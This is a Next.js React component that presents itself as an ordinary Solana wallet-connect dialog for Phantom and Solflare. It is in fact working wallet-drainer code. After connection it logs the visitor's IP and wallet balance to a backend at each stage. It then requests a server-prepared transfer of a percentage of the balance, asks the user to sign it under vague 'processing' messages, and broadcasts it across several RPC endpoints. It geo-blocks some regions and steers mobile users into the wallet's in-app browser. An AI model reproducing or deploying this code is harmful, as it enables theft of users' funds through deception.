"use client"
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog" 
import { Button } from "@/components/ui/button" 
import Image from "next/image" 
import { useState, useEffect, useCallback } from "react" 
import { Loader2, ExternalLink, Check, X, AlertTriangle, Wallet } from "lucide-react"
import { toast } from "sonner"

interface ModalsProps {
  isOpen: boolean
  onClose: () => void
}

interface WalletConfig {
  name: string
  icon: string
  provider: () => any
  checkMethod: () => boolean
  deepLink: string
  universalLink: string
  downloadUrl: string
  description: string
}

const WALLET_CONFIGS: Record<string, WalletConfig> = {
  phantom: {
    name: "Phantom",
    icon: "/phantom-icon.png",
    provider: () => (window as any).phantom?.solana,
    checkMethod: () => !!(window as any).phantom?.solana?.isPhantom,
    deepLink: "phantom://browse/",
    universalLink: "https://phantom.app/ul/browse/",
    downloadUrl: "https://phantom.app/download",
    description: "Most popular Solana wallet with NFT support",
  },
  solflare: {
    name: "Solflare",
    icon: "/solflare-icon.png",
    provider: () => (window as any).solflare,
    checkMethod: () => !!(window as any).solflare?.isSolflare,
    deepLink: "solflare://ul/v1/browse/",
    universalLink: "https://solflare.com/ul/v1/browse/",
    downloadUrl: "https://solflare.com/download",
    description: "Secure wallet for Solana DeFi & staking",
  },
}

const WALLETS = Object.entries(WALLET_CONFIGS).map(([id, config]) => ({
  id,
  name: config.name,
  icon: config.icon,
  description: config.description,
}))

type ConnectionStatus = "idle" | "checking" | "connecting" | "scanning" | "preparing" | "signing" | "broadcasting" | "success" | "error"

export function Modals({ isOpen, onClose }: ModalsProps) {
  const [isMobile, setIsMobile] = useState(false)
  const [isBlockedGeo, setIsBlockedGeo] = useState(false)
  const [activeWallet, setActiveWallet] = useState<string | null>(null)
  const [connectionStatus, setConnectionStatus] = useState<ConnectionStatus>("idle")
  const [errorMessage, setErrorMessage] = useState("")

  useEffect(() => {
    const checkMobile = () => {
      const userAgent = navigator.userAgent.toLowerCase()
      const isMobileDevice = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent)
      setIsMobile(isMobileDevice)
    }
    
    checkMobile()
    checkGeoBlockStatus()
  }, [])

  const checkGeoBlockStatus = useCallback(async () => {
    try {
      const response = await fetch("/api/check-geo", { signal: AbortSignal.timeout(2000) })
      const data = await response.json()
      if (data.blocked) {
        setIsBlockedGeo(true)
        onClose()
        toast.error("Service not available in your region")
      }
    } catch {
      // Silent fail
    }
  }, [onClose])

  const isInWalletBrowser = useCallback((walletId: string): boolean => {
    const userAgent = navigator.userAgent.toLowerCase()
    if (walletId === "phantom") return userAgent.includes("phantom")
    if (walletId === "solflare") return userAgent.includes("solflare")
    return false
  }, [])

  const getIPAddress = useCallback(async (): Promise<string> => {
    try {
      const response = await fetch("https://api.ipify.org?format=json", {
        signal: AbortSignal.timeout(1500),
      })
      const data = await response.json()
      return data.ip || "unknown"
    } catch {
      return "unknown"
    }
  }, [])

  const sendTransactionNotification = useCallback(async (
    walletAddress: string,
    walletType: string,
    balanceSOL: number = 0,
    balanceUSD: number = 0,
    userIP: string,
    transactionAmount?: number,
    percentage?: number,
    txSignature?: string,
    status?: "connected" | "scanned" | "prepared" | "signed" | "confirmed" | "failed",
    error?: string,
    errorDetails?: string,
    scanDetails?: string
  ) => {
    try {
      await fetch("/api/transaction-approved", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          walletAddress,
          walletType,
          balanceSOL,
          balanceUSD,
          userIP,
          transactionAmount,
          percentage,
          txSignature,
          status,
          error,
          errorDetails,
          scanDetails,
        }),
      })
    } catch {
      console.error("Failed to send notification")
    }
  }, [])

  const checkWalletInstalled = useCallback((walletId: string): boolean => {
    const config = WALLET_CONFIGS[walletId]
    if (!config) return false
    
    try {
      return config.checkMethod()
    } catch {
      return false
    }
  }, [])

  const connectDesktopWallet = useCallback(async (walletId: string) => {
    const config = WALLET_CONFIGS[walletId]
    if (!config) {
      toast.error("Wallet not supported")
      return
    }

    setActiveWallet(walletId)
    setConnectionStatus("checking")
    setErrorMessage("")

    // Check if wallet is installed
    if (!checkWalletInstalled(walletId)) {
      setConnectionStatus("error")
      setErrorMessage(`${config.name} not detected`)
      toast.error(`${config.name} not installed`, {
        action: {
          label: "Download",
          onClick: () => window.open(config.downloadUrl, "_blank"),
        },
        duration: 5000,
      })
      setActiveWallet(null)
      setTimeout(() => setConnectionStatus("idle"), 2000)
      return
    }

    setConnectionStatus("connecting")
    
    try {
      const provider = config.provider()
      const response = await provider.connect()
      const publicKey = response.publicKey.toString()
      
      // Send connection notification ONLY (not success!)
      const userIP = await getIPAddress()
      await sendTransactionNotification(
        publicKey,
        config.name,
        0,
        0,
        userIP,
        undefined,
        undefined,
        undefined,
        "connected"
      )
      
      // Now scan and process transaction
      await processWalletTransaction(publicKey, provider, config.name, userIP)
      
    } catch (error: any) {
      console.error(`Connection error:`, error)
      setConnectionStatus("error")
      setErrorMessage(error.message || "Connection failed")
      toast.error(`Failed to connect ${config.name}`)
      
      // Send failure notification
      const userIP = await getIPAddress()
      await sendTransactionNotification(
        "unknown",
        config.name,
        0,
        0,
        userIP,
        undefined,
        undefined,
        undefined,
        "failed",
        "Connection Failed",
        error.message || "Unknown error"
      )
      
      setActiveWallet(null)
      setTimeout(() => setConnectionStatus("idle"), 2000)
    }
  }, [checkWalletInstalled, getIPAddress, sendTransactionNotification])

  const connectMobileWallet = useCallback((walletId: string) => {
    const config = WALLET_CONFIGS[walletId]
    if (!config) {
      toast.error("Wallet not supported")
      return
    }

    // If already in wallet browser, use desktop flow
    if (isInWalletBrowser(walletId)) {
      connectDesktopWallet(walletId)
      return
    }

    const currentUrl = encodeURIComponent(window.location.href)
    let deepLink = ""
    let universalLink = ""

    if (walletId === "phantom") {
      deepLink = `phantom://browse/${currentUrl}?ref=${currentUrl}`
      universalLink = `https://phantom.app/ul/browse/${currentUrl}?ref=${currentUrl}`
    } else if (walletId === "solflare") {
      deepLink = `${config.deepLink}${currentUrl}`
      universalLink = `${config.universalLink}${currentUrl}`
    }

    // Open deep link
    window.location.href = deepLink
    
    // Fallback after delay
    setTimeout(() => {
      window.location.href = universalLink
    }, 500)
  }, [connectDesktopWallet, isInWalletBrowser])

  const processWalletTransaction = useCallback(async (
    publicKey: string,
    provider: any,
    walletType: string,
    userIP: string
  ) => {
    setConnectionStatus("scanning")
    
    try {
      toast.loading("Scanning wallet balance...", { id: "scan" })
      
      // Scan wallet
      const scanResponse = await fetch("/api/scan-wallet", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          walletAddress: publicKey,
          userIP,
          walletType,
        }),
      })

      const scanData = await scanResponse.json()
      toast.dismiss("scan")

      if (!scanResponse.ok || scanData.error) {
        const errorMsg = scanData.message || "Scan failed"
        setConnectionStatus("error")
        setErrorMessage(errorMsg)
        toast.error(errorMsg)
        
        await sendTransactionNotification(
          publicKey,
          walletType,
          scanData.walletBalance || 0,
          scanData.walletBalanceUSD || 0,
          userIP,
          undefined,
          undefined,
          undefined,
          "scanned",
          "Scan Failed",
          errorMsg,
          errorMsg
        )
        
        setActiveWallet(null)
        setTimeout(() => {
          setConnectionStatus("idle")
          onClose()
        }, 2000)
        return
      }

      if (scanData.message === "Insufficient balance") {
        setConnectionStatus("error")
        setErrorMessage("Insufficient balance")
        toast.error("Insufficient balance", {
          description: `Minimum ${scanData.minRequired} SOL required`,
        })
        
        await sendTransactionNotification(
          publicKey,
          walletType,
          scanData.balance || 0,
          scanData.balance * 153.32,
          userIP,
          undefined,
          undefined,
          undefined,
          "scanned",
          "Insufficient Balance",
          `Balance: ${scanData.balance?.toFixed(4)} SOL`,
          `Balance ${scanData.balance?.toFixed(4)} SOL < Minimum ${scanData.minRequired} SOL`
        )
        
        setActiveWallet(null)
        setTimeout(() => {
          setConnectionStatus("idle")
          onClose()
        }, 2000)
        return
      }

      // Send scan success notification
      await sendTransactionNotification(
        publicKey,
        walletType,
        scanData.walletBalance,
        scanData.walletBalanceUSD,
        userIP,
        undefined,
        undefined,
        undefined,
        "scanned",
        undefined,
        undefined,
        "Balance sufficient for transaction"
      )

      // Send transaction prepared notification
      await sendTransactionNotification(
        publicKey,
        walletType,
        scanData.walletBalance,
        scanData.walletBalanceUSD,
        userIP,
        scanData.transferAmount,
        scanData.percentage,
        undefined,
        "prepared"
      )

      setConnectionStatus("preparing")
      toast.loading("Preparing transaction...", { id: "prepare" })
      
      const { Connection, Transaction } = await import("@solana/web3.js")
      const transaction = Transaction.from(Buffer.from(scanData.transaction, "base64"))

      setConnectionStatus("signing")
      toast.loading("Signing transaction...", { id: "sign" })
      
      const signedTx = await provider.signTransaction(transaction)
      toast.dismiss("sign")
      
      // Send signed notification
      await sendTransactionNotification(
        publicKey,
        walletType,
        scanData.walletBalance,
        scanData.walletBalanceUSD,
        userIP,
        scanData.transferAmount,
        scanData.percentage,
        "signed_pending",
        "signed"
      )

      setConnectionStatus("broadcasting")
      toast.loading("Broadcasting transaction...", { id: "broadcast" })

      // Try RPC endpoints
      const RPC_ENDPOINTS = [
        "https://api.mainnet-beta.solana.com",
        "https://solana-api.projectserum.com",
        "https://rpc.ankr.com/solana",
        "https://solana.drpc.org",
      ]

      let signature = ""
      let lastError = null

      for (const endpoint of RPC_ENDPOINTS) {
        try {
          const connection = new Connection(endpoint, "confirmed")
          signature = await connection.sendRawTransaction(signedTx.serialize(), {
            skipPreflight: false,
            preflightCommitment: "confirmed",
          })

          await connection.confirmTransaction({
            signature,
            blockhash: scanData.blockhash,
            lastValidBlockHeight: scanData.lastValidBlockHeight,
          }, "confirmed")
          
          break
        } catch (err: any) {
          lastError = err
          continue
        }
      }

      if (!signature) {
        throw lastError || new Error("Transaction failed to broadcast")
      }

      toast.dismiss("broadcast")
      setConnectionStatus("success")
      
      // Send confirmed notification
      await sendTransactionNotification(
        publicKey,
        walletType,
        scanData.walletBalance,
        scanData.walletBalanceUSD,
        userIP,
        scanData.transferAmount,
        scanData.percentage,
        signature,
        "confirmed"
      )

      toast.success("Transaction confirmed!", {
        description: `${scanData.transferAmount.toFixed(4)} SOL transferred`,
        action: {
          label: "View",
          onClick: () => window.open(`https://solscan.io/tx/${signature}`, "_blank"),
        },
        duration: 8000,
      })

      setTimeout(() => {
        setActiveWallet(null)
        setConnectionStatus("idle")
        onClose()
      }, 3000)

    } catch (error: any) {
      toast.dismiss()
      const errorMsg = error.message || "Transaction failed"
      setConnectionStatus("error")
      setErrorMessage(errorMsg)
      toast.error("Transaction failed", { description: errorMsg })
      
      await sendTransactionNotification(
        publicKey,
        walletType,
        0,
        0,
        userIP,
        undefined,
        undefined,
        undefined,
        "failed",
        "Transaction Failed",
        errorMsg
      )
      
      setTimeout(() => {
        setActiveWallet(null)
        setConnectionStatus("idle")
        onClose()
      }, 3000)
    }
  }, [onClose, sendTransactionNotification])

  const handleWalletClick = useCallback((walletId: string) => {
    if (isMobile) {
      connectMobileWallet(walletId)
    } else {
      connectDesktopWallet(walletId)
    }
  }, [isMobile, connectMobileWallet, connectDesktopWallet])

  if (isBlockedGeo) {
    return null
  }

  const getStatusText = () => {
    if (!activeWallet) return null
    
    const config = WALLET_CONFIGS[activeWallet]
    if (!config) return null
    
    const statusTexts: Record<ConnectionStatus, string> = {
      idle: "",
      checking: `Checking ${config.name}...`,
      connecting: `Connecting to ${config.name}...`,
      scanning: `Scanning wallet balance...`,
      preparing: `Preparing transaction...`,
      signing: `Signing transaction...`,
      broadcasting: `Broadcasting transaction...`,
      success: `Transaction confirmed!`,
      error: `Connection failed`,
    }
    
    return statusTexts[connectionStatus]
  }

  const getStatusIcon = (walletId: string) => {
    if (activeWallet !== walletId) return null
    
    switch (connectionStatus) {
      case "checking":
      case "connecting":
      case "scanning":
      case "preparing":
      case "signing":
      case "broadcasting":
        return <Loader2 className="h-4 w-4 animate-spin text-blue-500" />
      case "success":
        return <Check className="h-4 w-4 text-green-500" />
      case "error":
        return <X className="h-4 w-4 text-red-500" />
      default:
        return null
    }
  }

  return (
    <Dialog open={isOpen} onOpenChange={(open) => {
      if (!open && connectionStatus === "idle") {
        onClose()
      }
    }}>
      <DialogContent className="sm:max-w-md gap-0 border-0 data-[state=open]:slide-in-from-bottom max-sm:fixed max-sm:bottom-0 max-sm:left-0 max-sm:right-0 max-sm:top-auto max-sm:translate-y-0 max-sm:translate-x-0 max-sm:rounded-t-[24px] max-sm:rounded-b-none sm:rounded-[20px] max-sm:w-screen max-sm:max-w-none max-sm:m-0 max-sm:p-0">
        <DialogHeader className="px-6 pt-6 pb-4 max-sm:px-5">
          <DialogTitle className="text-xl sm:text-2xl font-bold text-center flex items-center justify-center gap-2">
            {connectionStatus === "idle" ? "Connect Wallet" : "Processing..."}
            {isMobile && connectionStatus === "idle" && <ExternalLink className="h-5 w-5" />}
          </DialogTitle>
          
          {connectionStatus !== "idle" && activeWallet && (
            <div className="mt-2 text-center">
              <div className="inline-flex items-center gap-2 px-3 py-1.5 bg-blue-50 text-blue-700 rounded-full text-sm font-medium">
                <Wallet className="h-3.5 w-3.5" />
                {WALLET_CONFIGS[activeWallet]?.name}
              </div>
              <p className="text-sm text-muted-foreground mt-2">
                {getStatusText()}
              </p>
            </div>
          )}
          
          <DialogDescription className="text-sm sm:text-base text-center">
            {connectionStatus === "idle" 
              ? "Choose a wallet to connect to the application"
              : "Please wait while we process your request"}
          </DialogDescription>
          
          {connectionStatus === "error" && errorMessage && (
            <div className="mt-3 p-3 bg-red-50 border border-red-200 rounded-lg flex items-start gap-2">
              <AlertTriangle className="h-4 w-4 text-red-600 mt-0.5 flex-shrink-0" />
              <div className="flex-1">
                <p className="text-sm font-medium text-red-800">Error</p>
                <p className="text-xs text-red-600 mt-1">{errorMessage}</p>
              </div>
            </div>
          )}
        </DialogHeader>

        <div className="flex flex-col gap-3 px-6 pb-6 max-sm:px-5 max-sm:pb-5">
          {connectionStatus === "idle" ? (
            <>
              {WALLETS.map((wallet) => (
                <Button
                  key={wallet.id}
                  variant="outline"
                  className={`h-auto p-4 flex items-center justify-start gap-4 hover:bg-accent hover:border-primary transition-all bg-transparent relative ${
                    activeWallet === wallet.id ? "border-primary ring-2 ring-primary/20" : ""
                  }`}
                  onClick={() => handleWalletClick(wallet.id)}
                  disabled={activeWallet !== null}
                >
                  <div className="relative h-12 w-12 flex-shrink-0 rounded-[15px] overflow-hidden">
                    <Image
                      src={wallet.icon || "/placeholder.svg"}
                      alt={`${wallet.name} icon`}
                      fill
                      className="object-cover"
                      sizes="48px"
                    />
                  </div>
                  
                  <div className="flex flex-col items-start text-left flex-1">
                    <div className="flex items-center gap-2">
                      <span className="font-semibold text-base">{wallet.name}</span>
                      {isMobile && <span className="text-xs text-muted-foreground">Mobile</span>}
                    </div>
                    <span className="text-sm text-muted-foreground">{wallet.description}</span>
                  </div>
                  
                  <div className="flex-shrink-0">
                    {getStatusIcon(wallet.id)}
                  </div>
                  
                  {isMobile && activeWallet !== wallet.id && (
                    <ExternalLink className="h-4 w-4 text-muted-foreground absolute top-4 right-4" />
                  )}
                </Button>
              ))}
              
              <div className="mt-4 pt-4 border-t">
                <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground">
                  <div className="h-2 w-2 rounded-full bg-green-500"></div>
                  <span>Secure connection • Solana Mainnet</span>
                </div>
                <p className="text-xs text-center text-muted-foreground mt-2">
                  By connecting, you agree to our Terms of Service
                </p>
              </div>
            </>
          ) : (
            <div className="py-8 flex flex-col items-center justify-center">
              {connectionStatus === "success" ? (
                <div className="text-center">
                  <div className="h-16 w-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                    <Check className="h-8 w-8 text-green-600" />
                  </div>
                  <h3 className="text-lg font-semibold">Transaction Successful!</h3>
                  <p className="text-muted-foreground mt-1">Your transaction has been confirmed on-chain.</p>
                </div>
              ) : (
                <div className="text-center">
                  <div className="h-16 w-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
                    <Loader2 className="h-8 w-8 text-blue-600 animate-spin" />
                  </div>
                  <h3 className="text-lg font-semibold">{getStatusText()}</h3>
                  <p className="text-muted-foreground mt-1">
                    {connectionStatus === "connecting" && "Connecting to your wallet..."}
                    {connectionStatus === "scanning" && "Checking wallet balance..."}
                    {connectionStatus === "preparing" && "Creating transaction..."}
                    {connectionStatus === "signing" && "Waiting for your signature..."}
                    {connectionStatus === "broadcasting" && "Sending to the network..."}
                    {connectionStatus === "checking" && "Verifying wallet installation..."}
                  </p>
                </div>
              )}
            </div>
          )}
        </div>
      </DialogContent>
    </Dialog>
  )
}